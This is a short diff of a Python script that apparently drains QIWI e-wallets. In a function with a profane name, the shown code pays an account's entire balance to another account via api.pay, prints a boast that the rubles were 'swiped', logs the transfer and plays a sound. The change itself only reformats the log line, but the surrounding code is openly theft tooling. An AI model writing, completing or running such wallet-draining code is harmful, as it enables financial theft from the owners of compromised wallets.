@@ -23,7 +23,7 @@ def EbatNihyiaQiwiPerevod():
                     api.pay(account=str(summ), amount=int(bal[0]), comment=' ')
                     print(Fore.YELLOW +  '!!!!!!! --- !!!! Скомуниздили ' + str(bal[0]) + " рублей !!!! --- !!!!!!!")
                     f = open('log.txt', 'a')
-                    f.write('Перевод' + str(bal[0]))
+                    f.write(' Перевод:  ' + str(bal[0]))
                     f.close()
                     song.play()
                       
